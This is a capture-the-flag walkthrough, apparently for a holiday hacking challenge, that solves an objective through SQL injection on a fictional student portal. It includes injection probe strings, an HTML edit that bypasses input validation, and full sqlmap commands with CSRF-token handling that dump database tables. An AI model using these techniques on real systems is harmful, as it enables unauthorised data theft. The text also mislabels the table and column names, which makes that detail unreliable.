# 9) Retrieve Scraps of Paper from Server

## Prompt

## Secondary Prompt from Krampus (learned this after solving haha)
You did it! Thank you so much. I can trust you!
To help you, I have flashed the firmware in your badge to unlock a useful new feature: magical teleportation through the steam tunnels.
As for those scraps of paper, I scanned those and put the images on my server.
I then threw the paper away.
Unfortunately, I managed to lock out my account on the server.
Hey! You’ve got some great skills. Would you please hack into my system and retrieve the scans?
I give you permission to hack into it, solving Objective 9 in your badge.
And, as long as you're traveling around, be sure to solve any other challenges you happen across.
## Solve Process
This one sends us to a website... which probably has an injection vuln.
Let's see!
1. Check application status sounds odd, let's focus on that field.
1. Let's try "a@a.com" -> application status is pending (good, someone already registered for us haha 😉)
1. Let's try:
    ```SQL
    a@a.com' OR 1=1;-- -
    ```
    and we get an error message that the email field can't contain ' in it.
    So... let's change the html (cause I'm lazy and just want to fingerprint) to be a text post instead of an email post so the browser doesn't validate it for us:
    ```html
    <input name="elfmail" type="email" id="inputEmail" class="form-control form-control-lg" placeholder="Email address" required="" autofocus="">
    ```
    becomes
    ```html
    <input name="elfmail" type="text" id="inputEmail" class="form-control form-control-lg" placeholder="Email address" required="" autofocus="">
    ```
1. Now let's try inputting "a@a.com' OR 1=1;-- -"

    Result: no error (good!)

1. Now let's fingerprint. http://www.sqlinjection.net/database-fingerprinting/ has some good tips, let's try:
    ```SQL
    a' '@a.com
    ```
    and we get an error message! Bingo!
    ```
    Error: SELECT status FROM applications WHERE elfmail = ''a' '@a.com'';
    You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near 'a' '@a.com''' at line 1
    ```
    This is good as we're not flying blind here now. We've now identified the SQL version used (MariaDB) as well as the table name "status" and column name "applications" and variable name "elfmail" which is pretty significant.

    *Skipping rabbit holes, look at the idiotic readme for more ;)*

    ...We see that the html calls:
    ```javascript
    function submitApplication() {
      console.log("Submitting");
      elfSign();
      document.getElementById("check").submit();
    }
    function elfSign() {
      var s = document.getElementById("token");

      const Http = new XMLHttpRequest();
      const url='/validator.php';
      Http.open("GET", url, false);
      Http.send(null);

      if (Http.status === 200) {
        console.log(Http.responseText);
        s.value = Http.responseText;
      }

    }
    ```
    first!
    Let's modify the csrf validation portion of SQLMap cause that will tie in nicely with the script and we won't have to change much else. The CSRF should instead download the validator.php page and spit it out as the variable. That should be pretty simple.
    Doing some OSINT we find that https://github.com/sqlmapproject/sqlmap/commit/780dbd1c64690726eed291e77f9a2fc12d230610 implements the CSRF check, so we can search the repo for conf.csrfToken and find that it gets set in https://github.com/sqlmapproject/sqlmap/blob/7dae324ed6ca4b7a49c4f6d3a9d0c83925a87614/lib/request/connect.py
    Let's **modify the SQLMap code** (* code changes not included here due to weirdities with the GPL license) to do a post to grab the validator.php page first and then convert it to a csrf token.

    ***we interrupt this walkthrough for a PSA***: *Always check if the request is GET or POST. **In this case it was a GET request.***

    Now that we've modified the code SQLMap is happily running with the following command:
    ```powershell
    python sqlmap.py -u 'https://studentportal.elfu.org/application-check.php?elfmail=a&token=a' --method GET -p elfmail --dbms "MySQL" --prefix="a@a.com' " --csrf-url='https://studentportal.elfu.org/validator.php' --csrf-token='token' --time-sec=10 --string='still'
    ```
    That query is taking some time, so let's kill it after it finds its first exploit. Then, we can run the following commands:
    ```powershell
    python sqlmap.py -u 'https://studentportal.elfu.org/application-check.php?elfmail=a&token=a' --method GET -p elfmail --dbms "MySQL" --prefix="a@a.com' " --csrf-url='https://studentportal.elfu.org/validator.php' --csrf-token='token' --time-sec=10 --string='still' --dbs
    # lists elfu and information_schema
    python sqlmap.py -u 'https://studentportal.elfu.org/application-check.php?elfmail=a&token=a' --method GET -p elfmail --dbms "MySQL" --prefix="a@a.com' " --csrf-url='https://studentportal.elfu.org/validator.php' --csrf-token='token' --time-sec=10 --string='still' --tables -D elfu
    # lists krampus, applications, and students
    python sqlmap.py -u 'https://studentportal.elfu.org/application-check.php?elfmail=a&token=a' --method GET -p elfmail --dbms "MySQL" --prefix="a@a.com' " --csrf-url='https://studentportal.elfu.org/validator.php' --csrf-token='token' --time-sec=10 --string='still' --dump -D elfu -T krampus
    # dumps 6 picture URLs:
    1,/krampus/0f5f510e.png
    2,/krampus/1cc7e121.png
    3,/krampus/439f15e6.png
    4,/krampus/667d6896.png
    5,/krampus/adb798ca.png
    6,/krampus/ba417715.png
    ```
1. Piecing together the images, we find the message contains:
    ```
    From the Desk of <unreadable>

    Date: August 23, 20<unreadable>

    Memo to Self:

    Finally! I've figured out how to destroy Christmas!
    Santa has a brand new, cutting edge sleigh guidance
    technology, called the Super Sled-o-matic.

    I've figured out a way to poison the data going into the
    system so that it will divert Santa's sled on Christmas
    Eve!

    Santa will be unable to make the trip and the holiday
    season will be destroyed! Santa's own technology will
    undermine him!

    That's what they deserve for not listening to my
    suggestions for supporting other holiday characters!

    Bwahahahahaha!
    ```
1. This gives us the answer, "Super Sled-o-matic"
1. Now that we've solved 8, Krampus now gives us another prompt:
    ```
    Wow! We’ve uncovered quite a nasty plot to destroy the holiday season.
    We’ve gotta stop whomever is behind it!
    I managed to find this protected document on one of the compromised machines in our environment.
    I think our attacker was in the process of exfiltrating it.
    I’m convinced that it is somehow associated with the plan to destroy the holidays. Can you decrypt it?
    There are some smart people in the NetWars challenge room who may be able to help us.
    ```